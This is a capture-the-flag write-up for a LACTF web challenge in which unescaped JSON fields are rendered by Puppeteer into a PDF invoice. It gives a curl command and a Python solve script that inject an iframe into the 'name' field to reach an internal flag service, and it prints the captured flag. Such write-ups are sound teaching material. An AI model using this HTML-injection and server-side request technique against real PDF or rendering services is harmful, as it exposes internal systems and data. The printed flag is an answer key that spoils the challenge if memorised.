# lactf-invoice-generator

**Category:** web

---

#### Description

The site generates a PDF invoice from JSON input (`name`, `item`, `cost`, `datePurchased`). The PDF is rendered by a headless browser.

#### Solution

The backend builds an HTML template using user input directly (no escaping) and renders it with Puppeteer:

* `dist/invoice-generator/server.js` inserts `${name}`, `${item}`, `${datePurchased}` into HTML.
* `page.setContent(invoiceHTML, { waitUntil: "load" })` then `page.pdf(...)`.

In the provided deployment, there is an internal service named `flag` on the Docker network:

* `dist/flag/flag.js` serves `GET /flag` with `FLAG: <flag>`.
* `dist/docker-compose.yml` shows `invoice-generator` depends on `flag`, both on the same network.

Exploit: HTML-inject an `<iframe>` that loads `http://flag:8081/flag`. Since Puppeteer renders the HTML server-side (inside the container network), it can reach the internal `flag` host and the flag becomes visible in the rendered page, then embedded into the generated PDF.

One-shot exploit (replace `URL` with your instancer URL):

```bash
URL='https://lactf-invoice-generator-w01xc.instancer.lac.tf'
curl -fsS -X POST "$URL/generate-invoice" \
  -H 'Content-Type: application/json' \
  --data-binary '{
    "name":"<div>ACME</div><iframe src=\"http://flag:8081/flag\" style=\"width:100%;height:200px;border:0\"></iframe>",
    "item":"pens",
    "cost":"1",
    "datePurchased":"2026-01-01"
  }' \
  -o invoice.pdf

# Extract flag from the PDF
strings -a invoice.pdf | rg -o 'lactf\{[^}]+\}'
```

Reference solve script (does the same thing and extracts from bytes/strings output):

```python
#!/usr/bin/env python3
import re
import subprocess
import sys

import requests

def main():
    if len(sys.argv) != 2:
        print(f"usage: {sys.argv[0]} <base_url>", file=sys.stderr)
        return 2
    base = sys.argv[1].rstrip("/")

    payload = {
        "name": '<div>ACME</div><iframe src="http://flag:8081/flag" style="width:100%;height:200px;border:0"></iframe>',
        "item": "pens",
        "cost": "1",
        "datePurchased": "2026-01-01",
    }

    r = requests.post(f"{base}/generate-invoice", json=payload, timeout=30)
    r.raise_for_status()
    pdf = r.content

    m = re.search(rb"lactf\{[^}]+\}", pdf)
    if m:
        print(m.group(0).decode())
        return 0

    # Fallback: run `strings` on the bytes.
    p = subprocess.run(
        ["strings", "-a"],
        input=pdf,
        stdout=subprocess.PIPE,
        stderr=subprocess.DEVNULL,
        check=True,
    )
    m = re.search(rb"lactf\{[^}]+\}", p.stdout)
    if not m:
        raise SystemExit("flag not found")
    print(m.group(0).decode())
    return 0

if __name__ == "__main__":
    raise SystemExit(main())
```

Flag obtained from the generated PDF: `lactf{plz_s4n1t1z3_y0ur_purch4s3_l1st}`
